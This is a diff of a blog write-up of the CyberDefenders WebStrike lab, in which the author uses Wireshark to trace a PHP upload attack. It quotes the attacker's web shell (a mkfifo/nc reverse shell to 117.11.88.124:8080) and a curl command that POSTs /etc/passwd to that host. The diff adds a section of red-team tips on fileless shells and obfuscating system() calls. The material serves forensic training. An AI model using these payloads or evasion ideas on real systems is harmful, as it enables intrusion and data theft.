@@ -14,11 +14,11 @@ tags:
   - "Wireshark"
 ---
 
-## First Lab: WebStrike at CyberDefenders
+# CyberDefenders Lab: WebStrike
 
-## Table of Contents
+# Table of Contents
 
-- [First Impressions](#first-impressions)
+- [Overview / Goal](#overview--goal)
 - [Lab Setup and Tools Used](#lab-setup-and-tools-used)
   - [Q1: Attack Origin](#q1-attack-origin)
   - [Q2: Attacker User-Agent](#q2-attacker-user-agent)
@@ -26,11 +26,11 @@ tags:
   - [Q4: Upload Directory Exposed](#q4-upload-directory-exposed)
   - [Q5: Reverse Shell Target Port](#q5-reverse-shell-target-port)
   - [Q6: File Exfiltrated](#q6-file-exfiltrated)
-- [Key Takeaways](#key-takeaways)
-- [What I'd Do Next](#what-id-do-next)
+- [What I'd Do Next (Blue Team)](#what-id-do-next)
+- [Refining the Attack (Red Team)](#refining-the-attack)
 - [Try This Lab Yourself](#try-this-lab-yourself)
 
-## First Impressions
+# Overview / Goal
 
 This was my first time using **CyberDefenders.org**. I've had some experience on HackTheBox before, so I was tiny bit confident going in. The scenario sounded straightforward:
 
@@ -38,7 +38,7 @@ This was my first time using **CyberDefenders.org**. I've had some experience on
 >
 > Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorised activity.
 
-## Lab Setup and Tools Used
+# Lab Setup and Tools Used
 
 After waiting for the lab to load, I hit the **Open** button and saw a desktop with a folder called "Start here". Inside, two folders:
 
@@ -49,7 +49,7 @@ I went with Wireshark cause I had previous experience with it.
 
 ---
 
-### Q1: Attack Origin {#q1-attack-origin}
+## Q1: Attack Origin {#q1-attack-origin}
 
 **Approach:** My thought process was:
 
@@ -76,18 +76,18 @@ Pasted it into an IP Geolocation tool outside the lab.
 
 ---
 
-### Q2: Attacker User-Agent {#q2-attacker-user-agent}
+## Q2: Attacker User-Agent {#q2-attacker-user-agent}
 
 Already had it from above:
 **Answer:** User-Agent ✅
 
-```text
+```plaintext
 Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 ```
 
 ---
 
-### Q3: Malicious File Uploaded{#q3-malicious-file-uploaded}
+## Q3: Malicious File Uploaded{#q3-malicious-file-uploaded}
 
 **Approach:** Using the exact approach of Q1. shows the payload in that HTTP POST.
 
@@ -120,7 +120,7 @@ If the web server executes `.php` anywhere (including `/uploads/`), it's game ov
 
 Attacker just hits:
 
-```text
+```plaintext
 http://shoporoma.com/reviews/uploads/image.jpg.php
 ```
 
@@ -138,7 +138,7 @@ Here's the malicious payload uploaded:
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
 ```
 
-#### What it does
+### What it does
 
 - `rm /tmp/f;`
   - Removes any old named pipe called `f` if it exists in `/tmp`
@@ -166,7 +166,7 @@ Let's unwrap what it does:
 
 ---
 
-### Q4: Upload Directory Exposed{#q4-upload-directory-exposed}
+## Q4: Upload Directory Exposed{#q4-upload-directory-exposed}
 
 **Approach:** Here we are looking for the **web-accessible path** (the URL directory), not the literal `/var/www/html/` backend path. I filtered with:
 
@@ -184,7 +184,7 @@ GET /reviews/uploads/image.jpg.php HTTP/1.1
 
 ---
 
-### Q5: Reverse Shell Target Port{#q5-reverse-shell-target-port}
+## Q5: Reverse Shell Target Port{#q5-reverse-shell-target-port}
 
 It's in the payload we just saw in Q3:
 
@@ -196,7 +196,7 @@ nc 117.11.88.124 8080
 
 ---
 
-### Q6: File Exfiltrated{#q6-file-exfiltrated-}
+## Q6: File Exfiltrated{#q6-file-exfiltrated-}
 
 **Approach:** I'm thinking, I'm trying to find a **GET**, **POST**, or **reverse shell command** where the attacker tried to `cat`, `scp`, `nc`, or `curl` a sensitive file. Time to follow the shell session. I filtered by:
 
@@ -218,27 +218,17 @@ curl -X POST -d /etc/passwd http://117.11.88.124:443/
 
 ---
 
-## Key Takeaways
+# What I'd Do Next (Blue Team) {#what-id-do-next}
 
-- Double-extension bypass (.jpg.php) shows weak filename filters. Never trust a file extension! Attackers still rely on old tricks. Weak upload filters are low-hanging fruit
-- PCAPs don't lie, Wireshark is a beast
+- Never trust user-provided filename. I'd add MIME type verification and content inspection.
+- Disable script execution in ANY directory meant for user uploads.
+- Setup alerts for spawning shells or using tools like nc or curl.
 
----
+# Refining the Attack (Red Team) {#refining-the-attack}
 
-## What I'd Do Next
+- I would attempt to use a Fileless Reverse Shell directly in memory instead of mkfifo to make forensic recovery harder.
+- Obfuscate the payload to try to hide `system()` calls from basic scanners
 
-- Add detection logic for `multipart/form-data` with `.php` in any filename
-- Write a Sigma rule for GET requests to `/uploads/.*\.php`
-- Lock down MIME type validation in upload endpoints
-- Disable PHP execution in `/uploads/` via `.htaccess`
-
----
-
-## Try This Lab Yourself
-
-This lab was nice for beginners exploring PCAP analysis and attacker movements.
+# Try This Lab Yourself
 
 🔗 Lab Link: [CyberDefenders: WebStrike](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)
-
-This lab was educational, realistic and fun. Good starting point to train PCAP.
-Next step: take what I learned here and build alert rules in my home-lab SIEM.
